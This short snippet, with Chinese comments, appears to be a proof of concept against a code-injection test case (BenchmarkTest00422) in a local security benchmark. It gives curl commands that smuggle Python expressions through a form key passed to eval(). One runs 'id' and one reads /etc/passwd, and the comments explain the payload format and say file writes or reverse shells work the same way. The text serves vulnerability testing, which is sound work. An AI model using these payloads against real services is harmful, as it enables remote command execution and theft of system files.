# 执行任意系统命令
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00422' \
  -d '__import__("os").popen("id").read()=BenchmarkTest00422'

# 读取任意文件
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00422' \
  -d '__import__("os").popen("cat /etc/passwd").read()=BenchmarkTest00422'

# 写文件/反弹shell等均可通过 Python 表达式链实现
# payload 结构：<任意 Python 表达式返回 str>=BenchmarkTest00422
# 注意：表单键名即为传入 eval() 的表达式，表单键值需包含 "BenchmarkTest00422" 子串